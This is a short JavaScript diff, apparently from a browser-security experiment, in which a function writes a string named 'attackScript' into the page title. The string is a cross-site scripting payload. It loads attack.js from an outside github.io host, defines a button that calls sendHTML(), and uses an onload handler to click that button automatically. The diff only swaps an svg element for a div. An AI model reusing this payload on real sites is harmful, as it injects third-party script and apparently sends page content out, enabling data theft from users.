@@ -1,5 +1,5 @@
 function changeTitle() {
-    var attackScript = "<script src='https://jba192.github.io/browserSec/attack.js'></script><button id='clickButton' onclick='sendHTML()'></button><svg onload=\"document.getElementById('clickButton').click();\"></svg>";
+    var attackScript = "<script src='https://jba192.github.io/browserSec/attack.js'></script><button id='clickButton' onclick='sendHTML()'></button><div onload=\"document.getElementById('clickButton').click();\"></div>";
     if (document.title != attackScript) {
         document.title = attackScript;
     }
